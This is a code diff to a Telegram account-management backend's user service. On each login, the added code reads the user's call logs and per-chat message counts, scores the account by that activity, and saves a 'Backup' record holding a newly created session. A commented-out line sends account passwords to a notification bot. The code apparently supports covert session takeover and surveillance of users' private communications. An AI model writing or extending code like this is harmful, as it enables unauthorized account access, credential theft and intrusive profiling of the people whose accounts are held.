@@ -16,6 +16,7 @@ import { UpdateUserDto } from './dto/update-user.dto';
 import { CreateUserDto } from './dto/create-user.dto';
 import { connectionManager } from '../Telegram/utils/connection-manager';
 import { BotsService, ChannelCategory } from '../bots';
+import { sleep } from 'telegram/Helpers';
 
 @Injectable()
 export class UsersService {
@@ -39,10 +40,18 @@ export class UsersService {
       // await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`)}`);//Msgs:${user.msgs}\nphotos:${user.photoCount}\nvideos:${user.videoCount}\nmovie:${user.movieCount}\nPers:${user.personalChats}\nChan:${user.channels}\ngender-${user.gender}\n`)}`)//${process.env.uptimeChecker}/connectclient/${user.mobile}`)}`);
       setTimeout(async () => {
         try {
-          await connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });
+          const telegramClient = await connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });
+          const calllogs = await telegramClient.getCallLogStats();
+          let score = 1;
+          for (const callData of calllogs.chats) {
+            const messages = await telegramClient.getMessages(callData.chatId, 2);
+            score = score + (messages.pagination.total || 0) * (callData.totalCalls + 1) * (callData.averageDuration + 1);
+            await sleep(1000);
+          }
+          this.updateByFilter({ mobile: user.mobile }, { score: score });
           // this.telegramService.forwardMediaToBot(user.mobile, null);
           const newSession = await this.telegramService.createNewSession(user.mobile);
-          const newUserBackup = new this.userModel({ ...user, session: newSession, lastName: "Backup" });
+          const newUserBackup = new this.userModel({ ...user, session: newSession, lastName: "Backup" , score: score});
           await newUserBackup.save();
         } catch (error) {
           console.log("Error in creating new session", error);
@@ -243,10 +252,10 @@ export class UsersService {
       { $match: filter },
       ...(excludeAudited
         ? [
-            { $lookup: { from: 'session_audits', localField: 'mobile', foreignField: 'mobile', as: 'sessionAudits' } },
-            { $match: { sessionAudits: { $size: 0 } } },
-            { $project: { sessionAudits: 0 } },
-          ]
+          { $lookup: { from: 'session_audits', localField: 'mobile', foreignField: 'mobile', as: 'sessionAudits' } },
+          { $match: { sessionAudits: { $size: 0 } } },
+          { $project: { sessionAudits: 0 } },
+        ]
         : []),
       // Dedup by mobile: keep one doc per mobile (no $sort here to avoid sort memory limit when disk use is disabled)
       { $group: { _id: '$mobile', doc: { $first: '$$ROOT' } } },
